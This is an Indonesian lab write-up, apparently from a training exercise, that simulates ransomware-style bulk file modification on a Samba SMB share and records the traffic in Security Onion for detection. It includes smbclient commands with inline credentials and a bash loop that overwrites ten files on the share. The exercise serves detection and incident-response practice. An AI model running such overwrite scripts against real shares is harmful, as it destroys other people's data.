# Bulk-File-Modification


## 1. Objective
Tujuan tahap ini adalah mensimulasikan perilaku awal ransomware dengan melakukan modifikasi massal terhadap file yang berada pada SMB share. Aktivitas yang dilakukan meliputi akses ke file, perubahan isi file, serta pengamatan trafik SMB yang dihasilkan selama proses berlangsung.

---

#### Tahap3.1 Persiapan Monitoring



Sebelum simulasi dijalankan, Security Onion dikonfigurasi untuk memantau seluruh trafik SMB antara attacker dan file server menggunakan tcpdump pada interface monitoring.



Tujuan tahap ini adalah memastikan seluruh aktivitas SMB selama simulasi dapat direkam sebagai evidence serangan.

---

\### Tahap 3.2 – Mount SMB Share di Kali



Shared folder `restricted` di-mount ke sistem Kali Linux menggunakan CIFS untuk memudahkan proses verifikasi isi file.



Perintah yang digunakan:



```bash

mkdir \~/smbshare



sudo mount -t cifs //192.168.4.5/restricted \~/smbshare \\

\-o username=user1

```



Verifikasi:



```bash

ls \~/smbshare

```



Hasil menunjukkan seluruh file pada shared folder berhasil terlihat dari sisi attacker.

---

\### Tahap 3.3 – Baseline Verification



Sebelum dilakukan modifikasi, kondisi awal file diverifikasi terlebih dahulu.



Perintah:



```bash

cat \~/smbshare/file1.txt

```



Hasil:



```text

file restricted 1

```



Tahap ini digunakan sebagai baseline untuk membandingkan kondisi file sebelum dan sesudah simulasi.

---

\### Tahap 3.4 – Single File Modification Validation



Pengujian awal dilakukan terhadap satu file untuk memastikan attacker dapat memodifikasi isi file melalui SMB.



File payload dibuat pada Kali Linux:



```bash

echo "FILE MODIFIED BY RANSOMWARE SIMULATION" > modified.txt

```



Kemudian file diunggah dan menimpa file target menggunakan SMB:



```bash

smbclient //192.168.4.5/restricted -U user1

```



```bash

put modified.txt file1.txt

```



Verifikasi dilakukan dengan mengunduh kembali file yang telah dimodifikasi:



```bash

get file1.txt verify.txt

```



```bash

cat verify.txt

```



Hasil:



```text

FILE MODIFIED BY RANSOMWARE SIMULATION

```



Hasil tersebut membuktikan bahwa attacker berhasil melakukan overwrite terhadap file yang berada pada shared folder.

---

\### Tahap 3.5 – Bulk File Modification



Setelah modifikasi satu file berhasil dilakukan, simulasi dilanjutkan dengan modifikasi massal terhadap seluruh file target.



Script yang digunakan:



```bash

\#!/bin/bash



for i in {1..10}

do

&#x20;   smbclient //192.168.4.5/restricted \\

&#x20;   -U user1%user1 \\

&#x20;   -c "put modified.txt file${i}.txt"

done

```



Eksekusi:



```bash

./bulk\_modify.sh

```



Hasil menunjukkan seluruh file dari `file1.txt` hingga `file10.txt` berhasil ditimpa dengan payload yang sama.



Tahap ini mensimulasikan perilaku ransomware yang melakukan perubahan terhadap banyak file dalam waktu singkat.

---

\### Tahap 3.6 – Bulk Modification Verification



Verifikasi dilakukan terhadap beberapa file sampel setelah proses bulk modification selesai.



Perintah:



```bash

get file1.txt verify1.txt

get file5.txt verify5.txt

get file10.txt verify10.txt

```



Pemeriksaan:



```bash

cat verify1.txt

cat verify5.txt

cat verify10.txt

```



Hasil:



```text

FILE MODIFIED BY RANSOMWARE SIMULATION

```



pada seluruh file yang diuji.



Hal ini menunjukkan bahwa proses modifikasi massal berhasil diterapkan pada seluruh file target.

---

\### Tahap 3.7 – Verifikasi Server



Verifikasi dilakukan langsung pada Ubuntu Samba Server.



Perintah:



```bash

sudo ls -lsh /srv/samba/share/restricted

```



Hasil menunjukkan ukuran file berubah menjadi 39 byte dan waktu modifikasi seluruh file diperbarui secara bersamaan.



Pemeriksaan isi file:



```bash

sudo cat /srv/samba/share/restricted/file1.txt

sudo cat /srv/samba/share/restricted/file10.txt

```



Hasil:



```text

FILE MODIFIED BY RANSOMWARE SIMULATION

```



Tahap ini membuktikan bahwa perubahan yang dilakukan dari sisi attacker benar-benar tersimpan pada filesystem server.

---

\### Tahap 3.8 – Evidence Monitoring



Selama proses bulk modification berlangsung, Security Onion berhasil menangkap trafik SMB antara attacker dan server.



Contoh evidence:



```text

192.168.4.100 → 192.168.4.5:445

```



dengan sejumlah paket SMB yang muncul secara berurutan selama script dijalankan.



Aktivitas ini menunjukkan adanya peningkatan operasi SMB write yang dapat digunakan sebagai indikator perilaku ransomware pada tahap investigasi dan incident response.

---

\### Kesimpulan



Simulasi ransomware ringan berhasil dilakukan melalui SMB share dengan melakukan modifikasi massal terhadap sepuluh file target. Perubahan berhasil diverifikasi dari sisi attacker maupun server, serta menghasilkan artefak jaringan yang dapat diamati oleh Security Onion sebagai bukti aktivitas serangan.



